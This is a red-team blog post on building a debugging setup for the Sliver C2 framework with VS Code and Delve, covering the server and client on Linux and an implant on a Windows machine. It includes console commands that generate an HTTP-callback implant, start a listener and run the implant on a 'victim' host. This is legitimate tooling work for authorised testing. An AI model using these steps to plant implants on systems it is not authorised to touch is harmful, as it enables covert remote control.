---
title: Setting Up a Sliver C2 Debugging Environment with VSCode & Delve
date: 2025-12-02 12:12:12 +5000
categories: [Red Teaming]
tags: [sliver c2, c2 debugging]    
---

## **Overview**

This post walks through setting up a complete debugging workflow for the Sliver C2 framework. It covers server-side debugging on Linux and implant debugging on a Windows target, all using VS Code with Go and Delve.
The steps are based on the [HN Security guide](https://hnsecurity.it/blog/customizing-sliver-part-1/), combined with my own experimentation and notes while building a reliable Sliver debugging environment.

We will set up:

- **Linux machine (ubuntu) for**  debugging Sliver server and client
- **Windows machine** for debugging the Sliver implant


## **Server-Side Debugging Environment**

#### **Install Go**

```bash
sudo apt update
sudo apt install golang
```

Verify that Go is installed correctly with the `go version` command.
You’ll install Visual Studio Code and the Go extension. When VSCode asks to install additional Go tools (IntelliSense, linters, and Delve), allow it.

### **Install Protobuf Toolchain**
To modify `.proto` files and generate `.pb.go` files, install:
Sliver requires:
- `protoc` v3.19.4 or later
- `protoc-gen-go` v1.27.1
- `protoc-gen-go-grpc` v1.2.0

Sliver have their [documentation](https://sliver.sh/docs?name=Compile+from+Source#protoc) for this. I’ve included the steps here to keep everything in one place.

#### **Install protoc**
First dowload your platform's version of [protoc](https://github.com/protocolbuffers/protobuf/releases/latest) and extract it. Here it is installed under `/opt/protoc`.
```bash
wget https://github.com/protocolbuffers/protobuf/releases/download/v3.19.4/protoc-3.19.4-linux-x86_64.zip -O /tmp/protoc.zip
unzip /tmp/protoc.zip -d /opt/protoc
```
Add protoc to PATH:
```bash
echo 'export PATH=/opt/protoc/bin:$PATH' >> ~/.bashrc
source ~/.bashrc
```
Verify:
```bash
protoc --version
```

#### **Install `protoc-gen-go` and `protoc-gen-go-grpc`**
Ensure `$GOPATH/bin` is in your `PATH`.
```bash
echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc
source ~/.bashrc
```

Install the generator plugins: 
```bash
go install google.golang.org/protobuf/cmd/protoc-gen-go@v1.27.1
go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.2.0
```

Verify:

```bash
protoc-gen-go --version
protoc-gen-go-grpc --version
```

### **Install Delve Debugger** 
```bash
go install github.com/go-delve/delve/cmd/dlv@latest
```

### **Configure VSCode**
The following VSCode configurations ensure Sliver builds with the correct tags and debug symbols.
Create `.vscode/launch.json` file and add the following configuration to it: 
```json
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Launch Sliver Client",
      "type": "go",
      "request": "launch",
      "mode": "debug",
      "program": "${workspaceFolder}/client",
      "buildFlags": "-tags osusergo,netgo,cgosqlite,sqlite_omit_load_extension,client -ldflags='-X github.com/bishopfox/sliver/client/version.Version=1.6.0'",
      "console": "integratedTerminal"
    },
    {
      "name": "Launch Sliver Server",
      "type": "go",
      "request": "launch",
      "mode": "debug",
      "program": "${workspaceFolder}/server",
      "buildFlags": "-tags osusergo,netgo,cgosqlite,go_sqlite,server -ldflags='-X github.com/bishopfox/sliver/client/version.Version=1.6.0'",
      "console": "integratedTerminal"
    }
  ]
}

```

Create `.vscode/settings.json`:
```json
{
  "go.toolsEnvVars": {
    "GOOS": "linux"
  },
  "go.delveConfig": {
    "dlvLoadConfig": {
      "maxStringLen": 5000,
      "maxArrayValues": 1000
    }
  }
}
```
This sets environment variables and Delve configurations necessary for debugging.

Inside VSCode run sliver server in debug mode by clicking Run and **Debug>Launch server**

![Image](/assets/images/Posts/Setting%20Up%20debugging%20env%20for%20sliver/demo01.png)

A new terminal windows will open running sliver server:
![Image](/assets/images/Posts/Setting%20Up%20debugging%20env%20for%20sliver/demo02.png)

In the Sliver console, create a new operator and enable multiplayer mode:
```shell
sliver > new-operator -l 127.0.0.1 -n me -P all

[*] Generating new client certificate, please wait ... 
[*] Saved new client config to: /home/tehreem/sliver/server/me_127.0.0.1.cfg 

sliver > multiplayer

[*] Multiplayer mode enabled
```

I have created an operator named **me**. Import the client configuration file in the Sliver client:
```
~/sliver/sliver-client import ~/sliver/server/me_127.0.0.1.cfg 
```

This will copy place the operator config in  ~/.sliver-client/configs/
Now, Run and **Debug>Launch client**
![Image](/assets/images/Posts/Setting%20Up%20debugging%20env%20for%20sliver/demo03.png)

## **Debugging Implants on Windows**
To debug implants you need:
- Go and Delve installed on Windows target
- A Sliver implant generated with debug symbols


#### **Install Delve on Windows** 
Ensure `$GOPATH\bin` is in your Windows PATH:
```powershell
go install github.com/go-delve/delve/cmd/dlv@latest
```
Ensure `$GOPATH\bin` is in your Windows PATH.

#### **Generate a Debuggable Implant**
Generate implant and start a listener:

```shell
Use " generate [command] --help" for more information about a command.

sliver > generate --http 192.168.0.113:8080  --debug

[*] Generating new windows/amd64 implant binary
[*] Build completed in 17s
[*] Implant saved to ~/sliver/client/SMILING_HYENA.exe


sliver > http --lhost 192.168.0.113 --lport 8080

[*] Starting HTTP :8080 listener ...
[*] Successfully started job #2

sliver > 
```

Sliver will store the implant source in: `~/.sliver/slivers/windows/amd64/<GENERATED IMPANT NAME>/src`. In my case it has stored it in `~/.sliver/slivers/windows/amd64/SPECIAL_NOTICE/src`. Open the implant source code folder in a new vscode windows.

#### **Configure VSCode for Remote Debugging**
In `.vscode/launch.json` add:
```json
{
    "name": "Debug Implant",
    "type": "go",
    "request": "attach",
    "mode": "remote",
    "remotePath": "",
    "host": "REMOTE_HOST", 
    "port": REMOTE_PORT,
}
```
Replace:

- `REMOTE_HOST` with your Windows machine (victim) IP
- `REMOTE_PORT` with port you will run Delve on

In `.vscode/settings.json` add:

```json
{
    "go.toolsEnvVars": {
        "GOOS": "windows"
    }
}
```

Then, attach VSCode from the Linux machine using the configuration above.
#### Run Delve Server on Windows
Transfer the implant to victim machine, navigate to the directory containing the generated implant and start dlv:
```cmd
dlv exec --api-version=2 --headless --listen REMOTE_HOST:REMOTE_PORT --log .\<GENERATED IMPLANT>.exe
```

![Image](/assets/images/Posts/Setting%20Up%20debugging%20env%20for%20sliver/demo05.png)

In my setup, the Delve server will run on the Windows machine at 192.168.0.108:7077. Update `launch.json` accordingly.

Attach VSCode from the Linux machine using the configuration above. Go to Run and **Debug >Debug implant** to start debugging the implant. If everything is configured correctly, you should see the connection appear on your C2 server.


With this setup, you can debug both Sliver’s server logic and implant behavior in real time. This workflow is especially useful when modifying implants, experimenting with transports, or understanding Sliver internals.
